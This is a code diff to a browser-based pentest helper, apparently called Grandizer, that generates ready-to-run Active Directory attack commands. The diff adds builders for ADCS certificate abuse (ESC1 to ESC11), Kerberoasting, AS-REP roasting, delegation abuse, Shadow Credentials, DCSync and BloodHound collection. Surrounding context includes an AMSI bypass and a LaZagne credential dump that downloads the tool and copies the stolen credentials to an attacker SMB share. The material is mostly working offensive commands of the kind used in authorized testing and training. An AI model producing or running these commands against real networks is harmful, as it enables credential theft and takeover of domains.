@@ -1896,16 +1896,23 @@ const BUILDERS=[
     if(m==='Patch')return '# Memory patch bypass:\n$a=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null,$null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,[IntPtr]$a)';
     return '# String concatenation bypass:\n$a="Sy";$b="stem.Ma";$c="nagement.Au";$d="tomation.Am";$e="siUtils"\n$f=[Ref].Assembly.GetType($a+$b+$c+$d+$e)\n$g="amsiIn";$h="itFail";$i="ed"\n$f.GetField($g+$h+$i,"NonPublic,Static").SetValue($null,$true)';}},
   {id:'certipy',title:'Certipy (ADCS)',fields:[
-    {id:'esctype',label:'ESC Type',type:'select',options:['ESC1','ESC4','ESC8']},
+    {id:'esctype',label:'ESC Type',type:'select',options:['ESC1','ESC2','ESC3','ESC4','ESC6','ESC7','ESC8','ESC9','ESC10','ESC11']},
     {id:'user',label:'Domain User',placeholder:'lowpriv@corp.local',type:'text'},
     {id:'pass',label:'Password',placeholder:'Password123',type:'text'},
     {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'},
     {id:'ca',label:'CA Name',placeholder:'corp-CA',type:'text'},
     {id:'template',label:'Template Name',placeholder:'VulnTemplate',type:'text'}
-  ],generate:function(v){var esc=v.esctype||'ESC1',u=v.user||'USER@DOMAIN',p=v.pass||'PASS',dc=v.dcip||'DC_IP',ca=v.ca||'CA_NAME',tmpl=v.template||'TEMPLATE';
-    if(esc==='ESC1')return '# ADCS ESC1 \u2014 Enrollee Supplies Subject\n# Step 1: Find vulnerable templates\ncertipy find -u '+u+' -p '+p+' -dc-ip '+dc+' -vulnerable -stdout\n\n# Step 2: Request cert as Administrator\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+' -upn administrator@'+u.split('@')[1]+'\n\n# Step 3: Authenticate with cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc+'\n\n# Step 4: Use the NT hash\nimpacket-psexec -hashes :NTHASH Administrator@'+dc;
-    if(esc==='ESC4')return '# ADCS ESC4 \u2014 Modify Template to ESC1\n# Step 1: Save + modify template\ncertipy template -u '+u+' -p '+p+' -dc-ip '+dc+' -template '+tmpl+' -save-old\n\n# Step 2: Request cert (now ESC1)\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+' -upn administrator@'+u.split('@')[1]+'\n\n# Step 3: Restore original template\ncertipy template -u '+u+' -p '+p+' -dc-ip '+dc+' -template '+tmpl+' -configuration '+tmpl+'.json\n\n# Step 4: Auth with cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
-    return '# ADCS ESC8 \u2014 NTLM Relay to Web Enrollment\n# Step 1: Start relay targeting CA web enrollment\nntlmrelayx.py -t http://'+dc+'/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Step 2: Coerce authentication (from another terminal)\npython3 PetitPotam.py LISTENER_IP '+dc+'\n\n# Step 3: Use captured Base64 cert\ncertipy auth -pfx dc.pfx -dc-ip '+dc+'\n\n# Alt: Use Rubeus on target\nRubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt';}},
+  ],generate:function(v){var esc=v.esctype||'ESC1',u=v.user||'USER@DOMAIN',p=v.pass||'PASS',dc=v.dcip||'DC_IP',ca=v.ca||'CA_NAME',tmpl=v.template||'TEMPLATE',dom=u.indexOf('@')!==-1?u.split('@')[1]:'DOMAIN';
+    if(esc==='ESC1')return '# ADCS ESC1 \u2014 Enrollee Supplies Subject\n# Step 1: Find vulnerable templates\ncertipy find -u '+u+' -p '+p+' -dc-ip '+dc+' -vulnerable -stdout\n\n# Step 2: Request cert as Administrator\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+' -upn administrator@'+dom+'\n\n# Step 3: Authenticate with cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc+'\n\n# Step 4: Use the NT hash\nimpacket-psexec -hashes :NTHASH Administrator@'+dc;
+    if(esc==='ESC2')return '# ADCS ESC2 \u2014 Any Purpose EKU or No EKU\n# Templates with "Any Purpose" or no EKU can be abused like ESC1\n# Step 1: Find templates with Any Purpose/No EKU\ncertipy find -u '+u+' -p '+p+' -dc-ip '+dc+' -vulnerable -stdout\n\n# Step 2: Request cert (same as ESC1 if SAN allowed)\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+' -upn administrator@'+dom+'\n\n# Step 3: Auth with cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC3')return '# ADCS ESC3 \u2014 Enrollment Agent Template\n# Step 1: Request enrollment agent cert\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+'\n\n# Step 2: Use agent cert to request cert on behalf of admin\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template User -on-behalf-of "'+dom+'\\\\administrator" -pfx '+u.split('@')[0]+'.pfx\n\n# Step 3: Auth with the admin cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC4')return '# ADCS ESC4 \u2014 Modify Template to ESC1\n# Step 1: Save + modify template\ncertipy template -u '+u+' -p '+p+' -dc-ip '+dc+' -template '+tmpl+' -save-old\n\n# Step 2: Request cert (now ESC1)\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+' -upn administrator@'+dom+'\n\n# Step 3: Restore original template\ncertipy template -u '+u+' -p '+p+' -dc-ip '+dc+' -template '+tmpl+' -configuration '+tmpl+'.json\n\n# Step 4: Auth with cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC6')return '# ADCS ESC6 \u2014 EDITF_ATTRIBUTESUBJECTALTNAME2 Flag\n# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled\n# Any template can specify SAN regardless of template config\n# Step 1: Verify flag\ncertutil -config "'+dc+'\\\\'+ca+'" -getreg "policy\\\\EditFlags"\n\n# Step 2: Request cert with arbitrary SAN\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template User -upn administrator@'+dom+'\n\n# Step 3: Auth\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC7')return '# ADCS ESC7 \u2014 Vulnerable CA ACL (ManageCA / ManageCertificates)\n# Step 1: Add yourself as officer (if ManageCA)\ncertipy ca -ca '+ca+' -add-officer '+u.split('@')[0]+' -u '+u+' -p '+p+' -dc-ip '+dc+'\n\n# Step 2: Enable SubjectAltRequiredName flag\ncertipy ca -ca '+ca+' -enable-template SubCA -u '+u+' -p '+p+' -dc-ip '+dc+'\n\n# Step 3: Request cert (will be denied)\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -template SubCA -upn administrator@'+dom+'\n\n# Step 4: Issue the denied request (ManageCertificates)\ncertipy ca -ca '+ca+' -issue-request REQUEST_ID -u '+u+' -p '+p+' -dc-ip '+dc+'\n\n# Step 5: Retrieve issued cert\ncertipy req -u '+u+' -p '+p+' -dc-ip '+dc+' -ca '+ca+' -retrieve REQUEST_ID\n\n# Step 6: Auth\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC8')return '# ADCS ESC8 \u2014 NTLM Relay to Web Enrollment\n# Step 1: Start relay targeting CA web enrollment\nntlmrelayx.py -t http://'+dc+'/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n\n# Step 2: Coerce authentication (from another terminal)\npython3 PetitPotam.py LISTENER_IP '+dc+'\n\n# Step 3: Use captured Base64 cert\ncertipy auth -pfx dc.pfx -dc-ip '+dc+'\n\n# Alt: Use Rubeus on target\nRubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt';
+    if(esc==='ESC9')return '# ADCS ESC9 \u2014 No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)\n# msPKI-Enrollment-Flag contains CT_FLAG_NO_SECURITY_EXTENSION\n# Step 1: Check for GenericWrite on target user\ncertipy shadow auto -u '+u+' -p '+p+' -dc-ip '+dc+' -account victimuser\n\n# Step 2: Change victim UPN to administrator\ncertipy account update -u '+u+' -p '+p+' -user victimuser -upn administrator@'+dom+' -dc-ip '+dc+'\n\n# Step 3: Request cert as victim (gets admin due to UPN)\ncertipy req -u victimuser@'+dom+' -hashes VICTIM_HASH -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+'\n\n# Step 4: Restore victim UPN\ncertipy account update -u '+u+' -p '+p+' -user victimuser -upn victimuser@'+dom+' -dc-ip '+dc+'\n\n# Step 5: Auth with admin cert\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    if(esc==='ESC10')return '# ADCS ESC10 \u2014 Weak Certificate Mapping\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc StrongCertificateBindingEnforcement = 0 or 1\n# Step 1: Check registry on DC\nreg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc" /v StrongCertificateBindingEnforcement\n\n# Step 2: Change victim UPN to administrator (need GenericWrite)\ncertipy account update -u '+u+' -p '+p+' -user victimuser -upn administrator@'+dom+' -dc-ip '+dc+'\n\n# Step 3: Request cert\ncertipy req -u victimuser@'+dom+' -hashes VICTIM_HASH -dc-ip '+dc+' -ca '+ca+' -template '+tmpl+'\n\n# Step 4: Restore UPN + Auth\ncertipy account update -u '+u+' -p '+p+' -user victimuser -upn victimuser@'+dom+' -dc-ip '+dc+'\ncertipy auth -pfx administrator.pfx -dc-ip '+dc;
+    return '# ADCS ESC11 \u2014 Relay to ICPR (RPC)\n# CA supports ICPR (RPC) without encryption\n# Step 1: Check if CA has IF_ENFORCEENCRYPTICERTREQUEST disabled\ncertipy find -u '+u+' -p '+p+' -dc-ip '+dc+' -vulnerable -stdout\n\n# Step 2: Relay via RPC instead of HTTP\ncertipy relay -ca '+dc+' -template DomainController\n\n# Step 3: Coerce authentication\npython3 PetitPotam.py LISTENER_IP '+dc+'\n\n# Step 4: Auth with captured cert\ncertipy auth -pfx dc.pfx -dc-ip '+dc;}},
   {id:'sigmapotato',title:'SigmaPotato / Modern Potato',fields:[
     {id:'variant',label:'Variant',type:'select',options:['SigmaPotato','EfsPotato','GodPotato','PrintSpoofer']},
     {id:'lhost',label:'LHOST',placeholder:'10.10.14.1',type:'text'},
@@ -1934,6 +1941,50 @@ const BUILDERS=[
     {id:'scope',label:'Scope',type:'select',options:['all','browsers','wifi','sysadmin','databases','mails','windows']}
   ],generate:function(v){var lh=v.lhost||'YOUR_IP',sc=v.scope||'all';
     return '# Transfer LaZagne:\ncertutil.exe -urlcache -f http://'+lh+'/lazagne.exe C:\\Temp\\lz.exe\n\n# Run (dumps ALL credentials from the system):\nC:\\Temp\\lz.exe '+sc+'\n\n# Save to file + exfiltrate:\nC:\\Temp\\lz.exe '+sc+' > C:\\Temp\\creds.txt 2>&1\n\n# Exfiltrate via SMB:\n# Kali: impacket-smbserver share /tmp/ -smb2support\ncopy C:\\Temp\\creds.txt \\\\'+lh+'\\share\\\n\n# What LaZagne finds:\n# - Browser passwords (Chrome, Firefox, Edge)\n# - WiFi passwords\n# - Windows Credential Manager\n# - PuTTY/WinSCP/FileZilla creds\n# - Mail client passwords\n# - Database credentials\n# - VPN/RDP saved passwords';}},
+  {id:'rubeus',title:'Rubeus (Kerberos Attacks)',fields:[
+    {id:'action',label:'Action',type:'select',options:['kerberoast','asreproast','s4u','ptt','dump','monitor']},
+    {id:'user',label:'Target User',placeholder:'svc_sql',type:'text'},
+    {id:'domain',label:'Domain',placeholder:'corp.local',type:'text'},
+    {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'},
+    {id:'hash',label:'NTLM Hash / Ticket',placeholder:'aad3b...',type:'text'}
+  ],generate:function(v){var a=v.action||'kerberoast',u=v.user||'TARGET_USER',d=v.domain||'DOMAIN',dc=v.dcip||'DC_IP',h=v.hash||'HASH';
+    if(a==='kerberoast')return '# Kerberoast \u2014 extract TGS hashes for cracking\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Target specific user:\nRubeus.exe kerberoast /user:'+u+' /outfile:hashes.txt\n\n# From Kali (impacket):\nimpacket-GetUserSPNs '+d+'/'+u+' -dc-ip '+dc+' -request\n\n# Crack with hashcat:\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt';
+    if(a==='asreproast')return '# AS-REP Roast \u2014 users without pre-auth\nRubeus.exe asreproast /outfile:asrep.txt\n\n# Target specific user:\nRubeus.exe asreproast /user:'+u+' /outfile:asrep.txt\n\n# From Kali:\nimpacket-GetNPUsers '+d+'/ -usersfile users.txt -dc-ip '+dc+' -format hashcat\n\n# Crack:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt';
+    if(a==='s4u')return '# S4U \u2014 Constrained Delegation abuse\n# Step 1: Request TGT for the service account\nRubeus.exe asktgt /user:'+u+' /rc4:'+h+' /domain:'+d+' /dc:'+dc+'\n\n# Step 2: S4U2Self + S4U2Proxy to impersonate admin\nRubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:administrator /msdsspn:cifs/TARGET.'+d+' /dc:'+dc+' /ptt\n\n# From Kali:\nimpacket-getST -spn cifs/TARGET.'+d+' -impersonate administrator '+d+'/'+u+' -hashes :'+h+' -dc-ip '+dc+'\nexport KRB5CCNAME=administrator@cifs_TARGET.'+d+'@'+d.toUpperCase()+'.ccache\nimpacket-psexec -k -no-pass TARGET.'+d;
+    if(a==='ptt')return '# Pass-the-Ticket\n# Import ticket:\nRubeus.exe ptt /ticket:BASE64_TICKET\n\n# Or from .kirbi file:\nRubeus.exe ptt /ticket:ticket.kirbi\n\n# Verify:\nklist\ndir \\\\\\\\DC01.'+d+'\\\\C$';
+    if(a==='dump')return '# Dump all tickets from memory:\nRubeus.exe dump\n\n# Dump specific LUID:\nRubeus.exe dump /luid:0x12345\n\n# Triage (list all tickets):\nRubeus.exe triage';
+    return '# Monitor for new TGTs (requires elevation):\nRubeus.exe monitor /interval:5 /nowrap\n\n# Monitor + auto-harvest:\nRubeus.exe harvest /interval:30';}},
+  {id:'sharphound',title:'SharpHound / BloodHound',fields:[
+    {id:'method',label:'Collection Method',type:'select',options:['All','DCOnly','Session','ACL','Trusts']},
+    {id:'domain',label:'Domain',placeholder:'corp.local',type:'text'},
+    {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'},
+    {id:'lhost',label:'Kali IP',placeholder:'10.10.14.1',type:'text'}
+  ],generate:function(v){var m=v.method||'All',d=v.domain||'DOMAIN',dc=v.dcip||'DC_IP',lh=v.lhost||'YOUR_IP';
+    return '# Transfer SharpHound:\ncertutil.exe -urlcache -f http://'+lh+'/SharpHound.exe C:\\Temp\\sh.exe\n\n# Run collection ('+m+'):\nC:\\Temp\\sh.exe -c '+m+' -d '+d+'\n\n# Or PowerShell version:\npowershell -ep bypass -c "Import-Module .\\SharpHound.ps1; Invoke-BloodHound -CollectionMethod '+m+' -Domain '+d+'"\n\n# Exfiltrate zip:\ncopy *BloodHound*.zip \\\\\\\\'+lh+'\\\\share\\\\\n\n# From Kali (bloodhound-python):\nbloodhound-python -u USER -p PASS -d '+d+' -dc '+dc+' -c '+m+' --zip\n\n# Import into BloodHound:\n# 1. Start neo4j: sudo neo4j start\n# 2. Start BloodHound\n# 3. Drag & drop the .zip file';}},
+  {id:'rbcd',title:'RBCD (Resource-Based Constrained Delegation)',fields:[
+    {id:'user',label:'Controlled User',placeholder:'lowpriv@corp.local',type:'text'},
+    {id:'pass',label:'Password',placeholder:'Password123',type:'text'},
+    {id:'target',label:'Target Computer',placeholder:'DC01',type:'text'},
+    {id:'domain',label:'Domain',placeholder:'corp.local',type:'text'},
+    {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'}
+  ],generate:function(v){var u=v.user||'USER@DOMAIN',p=v.pass||'PASS',t=v.target||'TARGET',d=v.domain||'DOMAIN',dc=v.dcip||'DC_IP';
+    return '# RBCD \u2014 Resource-Based Constrained Delegation\n# Requires: GenericWrite/GenericAll on target computer object\n\n# Step 1: Create a new machine account (if MachineAccountQuota > 0)\nimpacket-addcomputer '+d+'/'+u.split('@')[0]+':'+p+' -computer-name FAKEMACHINE$ -computer-pass FakeP@ss123 -dc-ip '+dc+'\n\n# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target\nimpacket-rbcd '+d+'/'+u.split('@')[0]+':'+p+' -action write -delegate-from FAKEMACHINE$ -delegate-to '+t+'$ -dc-ip '+dc+'\n\n# Step 3: Get service ticket via S4U\nimpacket-getST -spn cifs/'+t+'.'+d+' -impersonate administrator '+d+'/FAKEMACHINE$:FakeP@ss123 -dc-ip '+dc+'\n\n# Step 4: Use the ticket\nexport KRB5CCNAME=administrator@cifs_'+t+'.'+d+'@'+d.toUpperCase()+'.ccache\nimpacket-psexec -k -no-pass '+t+'.'+d+'\n\n# Cleanup: Remove delegation\nimpacket-rbcd '+d+'/'+u.split('@')[0]+':'+p+' -action flush -delegate-to '+t+'$ -dc-ip '+dc;}},
+  {id:'shadowcred',title:'Shadow Credentials',fields:[
+    {id:'user',label:'Attacker User',placeholder:'lowpriv@corp.local',type:'text'},
+    {id:'pass',label:'Password',placeholder:'Password123',type:'text'},
+    {id:'target',label:'Target Account',placeholder:'DC01$',type:'text'},
+    {id:'domain',label:'Domain',placeholder:'corp.local',type:'text'},
+    {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'}
+  ],generate:function(v){var u=v.user||'USER@DOMAIN',p=v.pass||'PASS',t=v.target||'TARGET$',d=v.domain||'DOMAIN',dc=v.dcip||'DC_IP';
+    return '# Shadow Credentials Attack\n# Requires: GenericWrite/GenericAll on target account (write to msDS-KeyCredentialLink)\n\n# Method 1: certipy (recommended)\ncertipy shadow auto -u '+u+' -p '+p+' -dc-ip '+dc+' -account '+t+'\n# This will add Key Credential, request cert, auth, and get NT hash\n\n# Method 2: pywhisker (manual steps)\npython3 pywhisker.py -d '+d+' -u '+u.split('@')[0]+' -p '+p+' --target '+t+' --action add --dc-ip '+dc+'\n\n# Then use the generated PFX:\ncertipy auth -pfx GENERATED.pfx -dc-ip '+dc+'\n\n# Method 3: Whisker.exe (on target)\nWhisker.exe add /target:'+t+'\nRubeus.exe asktgt /user:'+t+' /certificate:BASE64_CERT /password:CERT_PASS /getcredentials\n\n# Cleanup:\npython3 pywhisker.py -d '+d+' -u '+u.split('@')[0]+' -p '+p+' --target '+t+' --action remove --device-id DEVICE_ID --dc-ip '+dc;}},
+  {id:'dcsync',title:'DCSync',fields:[
+    {id:'user',label:'User with Replication Rights',placeholder:'admin@corp.local',type:'text'},
+    {id:'pass',label:'Password',placeholder:'Password123',type:'text'},
+    {id:'target',label:'Target User to Dump',placeholder:'administrator',type:'text'},
+    {id:'domain',label:'Domain',placeholder:'corp.local',type:'text'},
+    {id:'dcip',label:'DC IP',placeholder:'10.10.10.1',type:'text'}
+  ],generate:function(v){var u=v.user||'USER@DOMAIN',p=v.pass||'PASS',t=v.target||'administrator',d=v.domain||'DOMAIN',dc=v.dcip||'DC_IP';
+    return '# DCSync \u2014 Replicate domain credentials\n# Requires: Replicating Directory Changes + Replicating Directory Changes All\n\n# From Kali (impacket):\nimpacket-secretsdump '+d+'/'+u.split('@')[0]+':'+p+'@'+dc+'\n\n# Dump specific user:\nimpacket-secretsdump '+d+'/'+u.split('@')[0]+':'+p+'@'+dc+' -just-dc-user '+t+'\n\n# With NTLM hash instead of password:\nimpacket-secretsdump -hashes :NTHASH '+d+'/'+u.split('@')[0]+'@'+dc+'\n\n# From target (mimikatz):\nmimikatz.exe "lsadump::dcsync /user:'+d+'\\\\'+t+'" "exit"\n\n# Use the hash:\nimpacket-psexec -hashes :NTHASH '+t+'@'+dc+'\nevil-winrm -i '+dc+' -u '+t+' -H NTHASH';}},
   {id:'b64revshell',title:'Base64 Encoded Reverse Shell',fields:[
     {id:'lhost',label:'LHOST',placeholder:'10.10.14.1',type:'text'},
     {id:'lport',label:'LPORT',value:'443',type:'text'}
@@ -2260,7 +2311,9 @@ function initTriage(){
 }
 
 function runTriage(){
-  var input=document.getElementById('triageInput').value;
+  var el=document.getElementById('triageInput');
+  if(!el){showToast('Triage input not found','error');return;}
+  var input=el.value;
   if(!input.trim()){showToast('Paste enumeration output first','error');return;}
   var results=[];
   Object.keys(DETECTORS).forEach(function(key){
@@ -2538,7 +2591,7 @@ function filterReference(query){
    EXPORT
    ══════════════════════════════════════════════════ */
 function exportMarkdown(){
-  var md='# Grandizer v2 \u2014 Engagement Report\n\n';
+  var md='# Grandizer v3 \u2014 Engagement Report\n\n';
   md+='## Triage Results\n';
   if(STATE.triageResults.length){
     STATE.triageResults.forEach(function(r){md+='- ['+r.priority+'] '+r.meta.title+' \u2192 '+r.meta.wizardKey+'\n';});
@@ -2547,7 +2600,8 @@ function exportMarkdown(){
   if(STATE.completedPaths.size){STATE.completedPaths.forEach(function(k){md+='- \u2705 '+k+'\n';});}else{md+='None yet.\n';}
   md+='\n## Failed/Ruled Out Paths\n';
   if(STATE.failedPaths.size){STATE.failedPaths.forEach(function(k){md+='- \u274c '+k+'\n';});}else{md+='None yet.\n';}
-  md+='\n## Elapsed Time\n'+document.getElementById('footerTimer').textContent+'\n';
+  var timerEl=document.getElementById('footerTimer');
+  md+='\n## Elapsed Time\n'+(timerEl?timerEl.textContent:'N/A')+'\n';
   var blob=new Blob([md],{type:'text/markdown'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='grandizer_report.md';a.click();
   showToast('Report exported','success');
